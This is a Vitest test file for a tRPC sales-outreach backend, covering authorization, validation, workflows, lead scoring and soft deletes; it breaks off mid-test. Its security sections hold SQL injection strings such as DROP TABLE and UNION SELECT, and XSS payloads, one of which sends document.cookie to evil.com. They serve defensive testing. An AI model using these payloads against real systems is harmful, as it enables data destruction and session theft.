import { describe, expect, it } from "vitest";
import { appRouter } from "./routers";
import type { TrpcContext } from "./_core/context";

// ─── Context Helpers ─────────────────────────────────────────────────────────

function makeCtx(overrides: Partial<TrpcContext["user"]> = {}): TrpcContext {
  const clearedCookies: unknown[] = [];
  return {
    user: {
      id: 1,
      openId: "test-user-open-id",
      email: "test@apexai.com",
      name: "Test User",
      loginMethod: "manus",
      role: "user",
      createdAt: new Date(),
      updatedAt: new Date(),
      lastSignedIn: new Date(),
      ...overrides,
    },
    req: { protocol: "https", headers: {} } as TrpcContext["req"],
    res: {
      clearCookie: (_name: string, _opts: unknown) => clearedCookies.push({ _name, _opts }),
    } as TrpcContext["res"],
  };
}

function makeAdminCtx(): TrpcContext {
  return makeCtx({ id: 99, openId: "admin-open-id", email: "admin@apexai.com", name: "Admin User", role: "admin" });
}

function makeUnauthCtx(): TrpcContext {
  return {
    user: null,
    req: { protocol: "https", headers: {} } as TrpcContext["req"],
    res: {
      clearCookie: () => {},
    } as TrpcContext["res"],
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1: SECURITY TESTS
// ═══════════════════════════════════════════════════════════════════════════════

describe("SECURITY: Authentication & Authorization", () => {
  it("unauthenticated user cannot access protected lead routes", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.leads.list({})).rejects.toThrow();
  });

  it("unauthenticated user cannot create leads", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.leads.create({ firstName: "Hack", lastName: "Attempt" })).rejects.toThrow();
  });

  it("unauthenticated user cannot access campaigns", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.campaigns.list({})).rejects.toThrow();
  });

  it("unauthenticated user cannot access messages", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.messages.list({})).rejects.toThrow();
  });

  it("unauthenticated user cannot access analytics", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.analytics.globalMetrics()).rejects.toThrow();
  });

  it("unauthenticated user cannot access onboarding", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.onboarding.list()).rejects.toThrow();
  });

  it("unauthenticated user CAN access public testimonials", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.testimonials.list({});
    expect(Array.isArray(result)).toBe(true);
  });

  it("unauthenticated user CAN access auth.me (returns null)", async () => {
    const ctx = makeUnauthCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.auth.me();
    expect(result).toBeNull();
  });

  it("regular user cannot access admin routes", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.admin.users()).rejects.toThrow();
    await expect(caller.admin.systemStats()).rejects.toThrow();
    await expect(caller.admin.activityLogs({})).rejects.toThrow();
    await expect(caller.admin.getConfig()).rejects.toThrow();
  });

  it("regular user cannot create testimonials (admin-only)", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.testimonials.create({ clientName: "Unauthorized", industry: "Test", quote: "Should fail" })
    ).rejects.toThrow();
  });

  it("regular user cannot update testimonials (admin-only)", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.testimonials.update({ id: 1, quote: "Hacked quote" })
    ).rejects.toThrow();
  });

  it("regular user cannot delete testimonials (admin-only)", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.testimonials.delete({ id: 1 })).rejects.toThrow();
  });

  it("regular user cannot update user roles", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.admin.updateUserRole({ userId: 1, role: "admin" })).rejects.toThrow();
  });

  it("regular user cannot set system config", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.admin.setConfig({ key: "hack", value: "true" })).rejects.toThrow();
  });
});

describe("SECURITY: SQL Injection Prevention", () => {
  it("search with SQL injection attempt in leads", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    // Classic SQL injection attempts
    const injections = [
      "'; DROP TABLE leads; --",
      "1' OR '1'='1",
      "' UNION SELECT * FROM users --",
      "1; DELETE FROM leads WHERE 1=1",
      "' OR 1=1 --",
      "admin'--",
      "1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
    ];
    for (const injection of injections) {
      const result = await caller.leads.list({ search: injection });
      // Should return empty results, not crash or expose data
      expect(result).toHaveProperty("leads");
      expect(result).toHaveProperty("total");
      expect(Array.isArray(result.leads)).toBe(true);
    }
  });

  it("SQL injection in lead creation fields", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.leads.create({
      firstName: "'; DROP TABLE leads; --",
      lastName: "' OR '1'='1",
      email: "sqlinject@test.com",
      company: "' UNION SELECT * FROM users --",
      notes: "'; DELETE FROM users WHERE 1=1; --",
    });
    // Should succeed without executing injected SQL
    expect(result).toBeDefined();
    // Verify leads table still exists
    const leads = await caller.leads.list({});
    expect(leads).toHaveProperty("leads");
    // Verify the injection was stored as plain text, not executed
    const searchResult = await caller.leads.list({ search: "sqlinject@test.com" });
    const found = searchResult.leads.find((l) => l.email === "sqlinject@test.com");
    expect(found).toBeDefined();
    expect(found!.firstName).toBe("'; DROP TABLE leads; --");
  });

  it("SQL injection in campaign name", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.campaigns.create({
      name: "'; DROP TABLE campaigns; --",
      channels: ["sms"],
      goal: "appointments",
    });
    expect(result.success).toBe(true);
    // Verify campaigns table still works
    const campaigns = await caller.campaigns.list({});
    expect(campaigns).toHaveProperty("campaigns");
  });
});

describe("SECURITY: XSS Prevention", () => {
  it("XSS in lead fields should be stored as-is (sanitized on render)", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src=x onerror=alert("XSS")>',
      'javascript:alert("XSS")',
      '<svg onload=alert("XSS")>',
      '"><script>document.location="http://evil.com/?c="+document.cookie</script>',
    ];
    for (const payload of xssPayloads) {
      await caller.leads.create({
        firstName: payload,
        lastName: "XSSTest",
        notes: payload,
      });
    }
    const leads = await caller.leads.list({ search: "XSSTest" });
    expect(leads.leads.length).toBeGreaterThan(0);
    // Data should be stored (React auto-escapes on render)
    for (const lead of leads.leads) {
      expect(lead.firstName).toBeDefined();
    }
  });

  it("XSS in template body", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.templates.create({
      name: "XSS Template Test",
      channel: "email",
      body: '<script>alert("XSS")</script><p>Hello {{firstName}}</p>',
    });
    const templates = await caller.templates.list({});
    const found = templates.find((t) => t.name === "XSS Template Test");
    expect(found).toBeDefined();
    expect(found!.body).toContain("<script>");
  });

  it("XSS in campaign description", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.campaigns.create({
      name: "XSS Campaign",
      description: '<img src=x onerror=alert("XSS")>',
      channels: ["email"],
      goal: "appointments",
    });
    const campaigns = await caller.campaigns.list({});
    const found = campaigns.campaigns.find((c) => c.name === "XSS Campaign");
    expect(found).toBeDefined();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 2: INPUT VALIDATION & EDGE CASES
// ═══════════════════════════════════════════════════════════════════════════════

describe("EDGE CASES: Input Validation", () => {
  it("rejects lead with empty firstName", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.leads.create({ firstName: "", lastName: "Test" })
    ).rejects.toThrow();
  });

  it("rejects lead with empty lastName", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.leads.create({ firstName: "Test", lastName: "" })
    ).rejects.toThrow();
  });

  it("rejects campaign with empty name", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.campaigns.create({ name: "", channels: ["sms"], goal: "appointments" })
    ).rejects.toThrow();
  });

  it("rejects template with empty name", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.templates.create({ name: "", channel: "sms", body: "Hello" })
    ).rejects.toThrow();
  });

  it("rejects template with empty body", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.templates.create({ name: "Test", channel: "sms", body: "" })
    ).rejects.toThrow();
  });

  it("rejects invalid channel enum in message send", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.messages.send({
        leadId: 1,
        channel: "fax" as "sms",
        body: "Hello",
      })
    ).rejects.toThrow();
  });

  it("rejects invalid campaign goal enum", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.campaigns.create({
        name: "Bad Goal",
        channels: ["sms"],
        goal: "invalid_goal" as "appointments",
      })
    ).rejects.toThrow();
  });

  it("rejects invalid role in admin updateUserRole", async () => {
    const ctx = makeAdminCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.admin.updateUserRole({ userId: 1, role: "superadmin" as "admin" })
    ).rejects.toThrow();
  });

  it("rejects negative limit in leads list", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    // Negative limit should still work (drizzle handles it) or return empty
    const result = await caller.leads.list({ limit: -1 });
    expect(result).toHaveProperty("leads");
  });

  it("handles zero limit gracefully", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.leads.list({ limit: 0 });
    expect(result).toHaveProperty("leads");
  });

  it("handles very large offset", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.leads.list({ offset: 999999 });
    expect(result.leads).toHaveLength(0);
  });
});

describe("EDGE CASES: Unicode & Special Characters", () => {
  it("handles Unicode names in leads", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.leads.create({
      firstName: "José",
      lastName: "García",
      company: "日本語テスト株式会社",
      notes: "Ñoño 中文 العربية 한국어 🚀",
    });
    const leads = await caller.leads.list({ search: "José" });
    const found = leads.leads.find((l) => l.firstName === "José");
    expect(found).toBeDefined();
    expect(found!.lastName).toBe("García");
  });

  it("handles emoji in campaign name", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.campaigns.create({
      name: "🚀 Rocket Campaign 🎯",
      channels: ["sms", "email"],
      goal: "appointments",
    });
    const campaigns = await caller.campaigns.list({});
    const found = campaigns.campaigns.find((c) => c.name === "🚀 Rocket Campaign 🎯");
    expect(found).toBeDefined();
  });

  it("handles special characters in template body", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.templates.create({
      name: "Special Chars Template",
      channel: "email",
      body: "Hello {{firstName}}! Here's a quote: \"It's 100% effective\" — Dr. O'Brien & Associates™ ©2024 €500",
    });
    const templates = await caller.templates.list({});
    const found = templates.find((t) => t.name === "Special Chars Template");
    expect(found).toBeDefined();
    expect(found!.body).toContain("O'Brien");
  });

  it("handles very long strings", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const longString = "A".repeat(5000);
    await caller.leads.create({
      firstName: "LongNote",
      lastName: "Test",
      notes: longString,
    });
    const leads = await caller.leads.list({ search: "LongNote" });
    const found = leads.leads.find((l) => l.firstName === "LongNote");
    expect(found).toBeDefined();
    expect(found!.notes!.length).toBe(5000);
  });

  it("handles newlines and tabs in text fields", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.leads.create({
      firstName: "Newline",
      lastName: "Test",
      notes: "Line 1\nLine 2\tTabbed\r\nWindows line",
    });
    const leads = await caller.leads.list({ search: "Newline" });
    const found = leads.leads.find((l) => l.firstName === "Newline");
    expect(found).toBeDefined();
    expect(found!.notes).toContain("\n");
  });
});

describe("EDGE CASES: Boundary Values", () => {
  it("lead score is capped at 100", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    // Create a lead with all possible scoring fields
    await caller.leads.create({
      firstName: "MaxScore",
      lastName: "Test",
      email: "max@test.com",
      phone: "+15551234567",
      company: "MaxCo",
      industry: "Tech",
      title: "CEO Founder President",
      linkedinUrl: "https://linkedin.com/in/max",
    });
    const leads = await caller.leads.list({ search: "MaxScore" });
    const found = leads.leads.find((l) => l.firstName === "MaxScore");
    expect(found).toBeDefined();
    expect(found!.score).toBeLessThanOrEqual(100);
    expect(found!.score).toBeGreaterThan(0);
  });

  it("lead with no optional fields gets minimum score", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.leads.create({
      firstName: "MinScore",
      lastName: "Test",
    });
    const leads = await caller.leads.list({ search: "MinScore" });
    const found = leads.leads.find((l) => l.firstName === "MinScore");
    expect(found).toBeDefined();
    expect(found!.score).toBe(0);
  });

  it("campaign with zero daily limit", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.campaigns.create({
      name: "Zero Limit Campaign",
      channels: ["sms"],
      goal: "appointments",
      dailyLimit: 0,
    });
    const campaigns = await caller.campaigns.list({});
    const found = campaigns.campaigns.find((c) => c.name === "Zero Limit Campaign");
    expect(found).toBeDefined();
    expect(found!.dailyLimit).toBe(0);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 3: WORKFLOW INTEGRATION TESTS
// ═══════════════════════════════════════════════════════════════════════════════

describe("INTEGRATION: Lead → Campaign → Message Workflow", () => {
  it("full workflow: create lead, create campaign, add contact, send message", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    // Step 1: Create a lead
    await caller.leads.create({
      firstName: "Workflow",
      lastName: "Test",
      email: "workflow@test.com",
      phone: "+15551112222",
      company: "WorkflowCo",
      industry: "Solar",
    });
    const leadsResult = await caller.leads.list({ search: "Workflow" });
    const lead = leadsResult.leads.find((l) => l.firstName === "Workflow");
    expect(lead).toBeDefined();

    // Step 2: Create a campaign
    await caller.campaigns.create({
      name: "Workflow Test Campaign",
      channels: ["sms", "email"],
      goal: "appointments",
      industry: "Solar",
    });
    const campaignsResult = await caller.campaigns.list({});
    const campaign = campaignsResult.campaigns.find((c) => c.name === "Workflow Test Campaign");
    expect(campaign).toBeDefined();

    // Step 3: Add lead as contact to campaign
    await caller.campaigns.addContact({ campaignId: campaign!.id, leadId: lead!.id });
    const contacts = await caller.campaigns.getContacts({ campaignId: campaign!.id });
    expect(contacts.length).toBeGreaterThan(0);

    // Step 4: Send a message
    await caller.messages.send({
      leadId: lead!.id,
      campaignId: campaign!.id,
      channel: "sms",
      body: "Hi Workflow, interested in solar savings?",
    });
    const messages = await caller.messages.list({ leadId: lead!.id });
    expect(messages.length).toBeGreaterThan(0);
    expect(["sent", "queued", "failed"]).toContain(messages[0].status);
  });

  it("bulk send personalizes messages for each contact", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    // Create leads
    await caller.leads.create({ firstName: "BulkAlice", lastName: "One", email: "bulkalice@test.com", company: "AliceCo" });
    await caller.leads.create({ firstName: "BulkBob", lastName: "Two", email: "bulkbob@test.com", company: "BobCo" });

    const aliceResult = await caller.leads.list({ search: "BulkAlice" });
    const bobResult = await caller.leads.list({ search: "BulkBob" });
    const alice = aliceResult.leads.find((l) => l.firstName === "BulkAlice");
    const bob = bobResult.leads.find((l) => l.firstName === "BulkBob");
    expect(alice).toBeDefined();
    expect(bob).toBeDefined();

    // Create campaign and add contacts
    await caller.campaigns.create({ name: "Bulk Send Test", channels: ["email"], goal: "appointments" });
    const campaigns = await caller.campaigns.list({});
    const campaign = campaigns.campaigns.find((c) => c.name === "Bulk Send Test");
    expect(campaign).toBeDefined();

    await caller.campaigns.addContact({ campaignId: campaign!.id, leadId: alice!.id });
    await caller.campaigns.addContact({ campaignId: campaign!.id, leadId: bob!.id });

    // Bulk send with personalization
    const result = await caller.messages.bulkSend({
      campaignId: campaign!.id,
      channel: "email",
      subject: "Hi {{firstName}} from {{company}}",
      body: "Dear {{firstName}}, we have a great offer for {{company}}!",
    });
    expect(result.success).toBe(true);
    expect(result.sent).toBe(2);
  });
});

describe("INTEGRATION: Campaign Lifecycle", () => {
  it("campaign status transitions: draft → active → paused", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.campaigns.create({ name: "Lifecycle Test", channels: ["voice"], goal: "demos" });
    const campaigns = await caller.campaigns.list({});
    const campaign = campaigns.campaigns.find((c) => c.name === "Lifecycle Test");
    expect(campaign).toBeDefined();
    expect(campaign!.status).toBe("draft");

    // Activate
    await caller.campaigns.launch({ id: campaign!.id });
    const active = await caller.campaigns.get({ id: campaign!.id });
    expect(active.status).toBe("active");

    // Pause
    await caller.campaigns.pause({ id: campaign!.id });
    const paused = await caller.campaigns.get({ id: campaign!.id });
    expect(paused.status).toBe("paused");
  });
});

describe("INTEGRATION: Onboarding Workflow", () => {
  it("complete all onboarding steps", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.onboarding.create({ clientName: "Full Onboarding Test", industry: "HVAC" });
    const records = await caller.onboarding.list();
    const record = records.find((r) => r.clientName === "Full Onboarding Test");
    expect(record).toBeDefined();

    const allSteps = [
      "account_setup", "campaign_config", "lead_import", "template_setup",
      "test_campaign", "go_live", "week1_review", "week2_optimization",
      "week3_scaling", "week4_handoff",
    ];

    // Complete each step
    for (const step of allSteps) {
      const result = await caller.onboarding.updateStep({ id: record!.id, step, completed: true });
      expect(result.completedSteps).toContain(step);
    }

    // After all steps, status should be completed
    const finalResult = await caller.onboarding.updateStep({ id: record!.id, step: "week4_handoff", completed: true });
    expect(finalResult.status).toBe("completed");
  });

  it("toggle onboarding step on and off", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.onboarding.create({ clientName: "Toggle Test", industry: "Solar" });
    const records = await caller.onboarding.list();
    const record = records.find((r) => r.clientName === "Toggle Test");
    expect(record).toBeDefined();

    // Complete a step
    let result = await caller.onboarding.updateStep({ id: record!.id, step: "account_setup", completed: true });
    expect(result.completedSteps).toContain("account_setup");

    // Uncomplete the step
    result = await caller.onboarding.updateStep({ id: record!.id, step: "account_setup", completed: false });
    expect(result.completedSteps).not.toContain("account_setup");
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 4: DATA INTEGRITY TESTS
// ═══════════════════════════════════════════════════════════════════════════════

describe("DATA INTEGRITY: Lead Scoring", () => {
  it("CEO title gets bonus points", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.leads.create({
      firstName: "CEOScore",
      lastName: "Test",
      email: "ceo@test.com",
      title: "CEO",
    });
    const leads = await caller.leads.list({ search: "CEOScore" });
    const found = leads.leads.find((l) => l.firstName === "CEOScore");
    expect(found).toBeDefined();
    // email(20) + title(15) + CEO bonus(10) = 45
    expect(found!.score).toBeGreaterThanOrEqual(45);
  });

  it("VP title gets bonus points", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.leads.create({
      firstName: "VPScore",
      lastName: "Test",
      email: "vp@test.com",
      title: "VP of Sales",
    });
    const leads = await caller.leads.list({ search: "VPScore" });
    const found = leads.leads.find((l) => l.firstName === "VPScore");
    expect(found).toBeDefined();
    expect(found!.score).toBeGreaterThanOrEqual(45);
  });

  it("segment assignment based on score", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    // High score lead → hot
    await caller.leads.create({
      firstName: "HotLead",
      lastName: "Segment",
      email: "hot@test.com",
      phone: "+15551234567",
      company: "HotCo",
      industry: "Solar",
      title: "CEO",
      linkedinUrl: "https://linkedin.com/in/hot",
    });
    const hotResult = await caller.leads.list({ search: "HotLead" });
    const hot = hotResult.leads.find((l) => l.firstName === "HotLead");
    expect(hot!.segment).toBe("hot");

    // Low score lead → cold
    await caller.leads.create({
      firstName: "ColdLead",
      lastName: "Segment",
    });
    const coldResult = await caller.leads.list({ search: "ColdLead" });
    const cold = coldResult.leads.find((l) => l.firstName === "ColdLead");
    expect(cold!.segment).toBe("cold");
  });
});

describe("DATA INTEGRITY: Analytics Metrics", () => {
  it("global metrics returns valid numbers", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const metrics = await caller.analytics.globalMetrics();

    expect(typeof metrics.responseRate).toBe("number");
    expect(typeof metrics.scheduleRate).toBe("number");
    expect(typeof metrics.showRate).toBe("number");
    expect(typeof metrics.salesIncrease).toBe("number");
    expect(typeof metrics.totalLeads).toBe("number");
    expect(typeof metrics.totalCampaigns).toBe("number");
    expect(typeof metrics.totalMessages).toBe("number");
    expect(typeof metrics.totalRevenue).toBe("number");

    // Rates should be non-negative
    expect(metrics.responseRate).toBeGreaterThanOrEqual(0);
    expect(metrics.scheduleRate).toBeGreaterThanOrEqual(0);
    expect(metrics.showRate).toBeGreaterThanOrEqual(0);
    expect(metrics.totalLeads).toBeGreaterThanOrEqual(0);
  });

  it("campaign funnel returns valid structure", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.campaigns.create({ name: "Funnel Test", channels: ["sms"], goal: "appointments" });
    const campaigns = await caller.campaigns.list({});
    const campaign = campaigns.campaigns.find((c) => c.name === "Funnel Test");
    expect(campaign).toBeDefined();

    const funnel = await caller.analytics.campaignFunnel({ campaignId: campaign!.id });
    expect(funnel).toHaveProperty("campaign");
    expect(funnel).toHaveProperty("funnel");
    expect(funnel).toHaveProperty("roi");
    expect(funnel.funnel).toHaveLength(6);
    expect(funnel.funnel[0].stage).toBe("Total Contacts");
    expect(funnel.funnel[1].stage).toBe("Sent");
  });

  it("campaign funnel for non-existent campaign throws NOT_FOUND", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.analytics.campaignFunnel({ campaignId: 999999 })).rejects.toThrow();
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 5: ADMIN OPERATIONS
// ═══════════════════════════════════════════════════════════════════════════════

describe("ADMIN: System Configuration", () => {
  it("admin can set and get system config", async () => {
    const ctx = makeAdminCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.admin.setConfig({ key: "test_key", value: "test_value", category: "testing" });
    const config = await caller.admin.getConfig();
    expect(Array.isArray(config)).toBe(true);
    const found = config.find((c) => c.key === "test_key");
    expect(found).toBeDefined();
    expect(found!.value).toBe("test_value");
  });

  it("admin can overwrite existing config", async () => {
    const ctx = makeAdminCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.admin.setConfig({ key: "overwrite_key", value: "original" });
    await caller.admin.setConfig({ key: "overwrite_key", value: "updated" });
    const config = await caller.admin.getConfig();
    const found = config.find((c) => c.key === "overwrite_key");
    expect(found!.value).toBe("updated");
  });
});

describe("ADMIN: Testimonials Management", () => {
  it("admin full CRUD on testimonials", async () => {
    const ctx = makeAdminCtx();
    const caller = appRouter.createCaller(ctx);

    // Create
    await caller.testimonials.create({
      clientName: "CRUD Test Client",
      industry: "Real Estate",
      quote: "Amazing platform!",
      featured: true,
    });

    // Read
    const list = await caller.testimonials.list({});
    const found = list.find((t) => t.clientName === "CRUD Test Client");
    expect(found).toBeDefined();
    expect(found!.featured).toBe(true);

    // Update
    await caller.testimonials.update({ id: found!.id, quote: "Updated: Even more amazing!" });
    const updated = (await caller.testimonials.list({})).find((t) => t.id === found!.id);
    expect(updated!.quote).toBe("Updated: Even more amazing!");

    // Delete (soft delete)
    await caller.testimonials.delete({ id: found!.id });
    const afterDelete = (await caller.testimonials.list({})).find((t) => t.id === found!.id);
    expect(afterDelete).toBeUndefined(); // Soft deleted, won't show in active list
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 6: STABILITY & CONCURRENT OPERATIONS
// ═══════════════════════════════════════════════════════════════════════════════

describe("STABILITY: Concurrent Operations", () => {
  it("handles multiple simultaneous lead creations", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    const promises = Array.from({ length: 10 }, (_, i) =>
      caller.leads.create({
        firstName: `Concurrent${i}`,
        lastName: "StabilityTest",
        email: `concurrent${i}@test.com`,
      })
    );

    const results = await Promise.all(promises);
    expect(results).toHaveLength(10);

    const leads = await caller.leads.list({ search: "StabilityTest" });
    expect(leads.leads.length).toBeGreaterThanOrEqual(10);
  });

  it("handles multiple simultaneous campaign creations", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    const promises = Array.from({ length: 5 }, (_, i) =>
      caller.campaigns.create({
        name: `Concurrent Campaign ${i}`,
        channels: ["sms"],
        goal: "appointments",
      })
    );

    const results = await Promise.all(promises);
    expect(results).toHaveLength(5);
    results.forEach((r) => expect(r.success).toBe(true));
  });

  it("handles rapid sequential operations on same lead", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.leads.create({ firstName: "Rapid", lastName: "Updates", email: "rapid@test.com" });
    const leads = await caller.leads.list({ search: "Rapid" });
    const lead = leads.leads.find((l) => l.firstName === "Rapid");
    expect(lead).toBeDefined();

    // Rapid updates
    await caller.leads.update({ id: lead!.id, status: "contacted" });
    await caller.leads.update({ id: lead!.id, status: "qualified" });
    await caller.leads.update({ id: lead!.id, status: "converted" });

    const updated = await caller.leads.get({ id: lead!.id });
    expect(updated.status).toBe("converted");
  });
});

describe("STABILITY: Error Recovery", () => {
  it("get non-existent lead throws NOT_FOUND", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.leads.get({ id: 999999 })).rejects.toThrow();
  });

  it("get non-existent campaign throws NOT_FOUND", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(caller.campaigns.get({ id: 999999 })).rejects.toThrow();
  });

  it("voice AI call on non-existent lead throws NOT_FOUND", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await expect(
      caller.voiceAI.initiateCall({ leadId: 999999 })
    ).rejects.toThrow();
  });

  it("bulk send on campaign with no contacts throws BAD_REQUEST", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.campaigns.create({ name: "Empty Bulk Test", channels: ["sms"], goal: "appointments" });
    const campaigns = await caller.campaigns.list({});
    const campaign = campaigns.campaigns.find((c) => c.name === "Empty Bulk Test");
    expect(campaign).toBeDefined();

    await expect(
      caller.messages.bulkSend({
        campaignId: campaign!.id,
        channel: "sms",
        body: "Hello",
      })
    ).rejects.toThrow("No contacts assigned");
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 7: FILTER & SEARCH TESTS
// ═══════════════════════════════════════════════════════════════════════════════

describe("FILTERS: Lead Filtering", () => {
  it("filters leads by segment", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.leads.list({ segment: "hot" });
    expect(result).toHaveProperty("leads");
    for (const lead of result.leads) {
      expect(lead.segment).toBe("hot");
    }
  });

  it("filters leads by status", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.leads.list({ status: "new" });
    expect(result).toHaveProperty("leads");
    for (const lead of result.leads) {
      expect(lead.status).toBe("new");
    }
  });

  it("filters leads by verification status", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.leads.list({ verificationStatus: "pending" });
    expect(result).toHaveProperty("leads");
    for (const lead of result.leads) {
      expect(lead.verificationStatus).toBe("pending");
    }
  });

  it("search is case-insensitive", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    await caller.leads.create({ firstName: "SearchCase", lastName: "Test", email: "searchcase@test.com" });
    const upper = await caller.leads.list({ search: "SEARCHCASE" });
    const lower = await caller.leads.list({ search: "searchcase" });
    expect(upper.leads.length).toBeGreaterThan(0);
    expect(lower.leads.length).toBeGreaterThan(0);
  });
});

describe("FILTERS: Campaign Filtering", () => {
  it("filters campaigns by status", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.campaigns.list({ status: "draft" });
    expect(result).toHaveProperty("campaigns");
    for (const campaign of result.campaigns) {
      expect(campaign.status).toBe("draft");
    }
  });
});

describe("FILTERS: Template Filtering", () => {
  it("filters templates by channel", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);
    const result = await caller.templates.list({ channel: "sms" });
    expect(Array.isArray(result)).toBe(true);
    for (const template of result) {
      expect(template.channel).toBe("sms");
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 8: SOFT DELETE VERIFICATION
// ═══════════════════════════════════════════════════════════════════════════════

describe("SOFT DELETE: Templates", () => {
  it("deleted template is not returned in list", async () => {
    const ctx = makeCtx();
    const caller = appRouter.createCaller(ctx);

    await caller.templates.create({ name: "SoftDeleteTest", channel: "sms", body: "Test body" });
    const before = await caller.templates.list({});
    const template = before.find((t) => t.name === "SoftDeleteTest");
    expect(template).toBeDefined();

    await caller.templates.delete({ id: template!.id });
    const after = await caller.templates.list({});
    const deleted = after.find((t) => t.id === template!.id);
    expect(deleted).toBeUndefined();
  });
});

describe("SOFT DELETE: Testimonials", () => {
  it("deleted testimonial is not returned in public list", async () => {
    const adminCtx = makeAdminCtx();
    const adminCaller = appRouter.createCaller(adminCtx);

    await adminCaller.testimonials.create({
      clientName: "SoftDeleteTestimonial",
      industry: "Test",
      quote: "Will be deleted",
    });

    const before = await adminCaller.testimonials.list({});
    const testimonial = before.find((t) => t.clientName === "SoftDeleteTestimonial");
